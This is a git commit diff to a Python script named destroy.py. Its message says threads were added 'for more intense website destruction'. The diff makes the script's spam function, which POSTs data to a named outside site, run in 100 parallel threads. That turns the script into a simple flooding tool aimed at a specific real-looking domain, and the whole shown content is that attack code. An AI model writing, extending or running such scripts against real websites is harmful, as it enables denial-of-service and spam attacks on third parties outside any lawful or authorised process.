800f2f09cc3acc383d15df4a735fdf7a4c96da2d
charbel-dot <nassehcharbel@gmail.com>
2021-11-30 15:43:14 +0200

    Added **Threads ** for more intense website destruction

--- destroy.py
+++ destroy.py
@@ -1,4 +1,5 @@
 import requests
+import threading
 
 def spam():
     url = 'http://aidcash.site/1/'
@@ -11,4 +12,14 @@ def spam():
 
     sending_data = requests.post(url, data=data, allow_redirects=False)
 
-    print(f"Response code: {sending_data.status_code}")
+    print(f"\nResponse code: {sending_data.status_code}")
+
+threads = []
+
+for _ in range(100):
+    t = threading.Thread(target=spam)
+    t.start()
+    threads.append(t)
+
+for thread in threads:
+    thread.join()
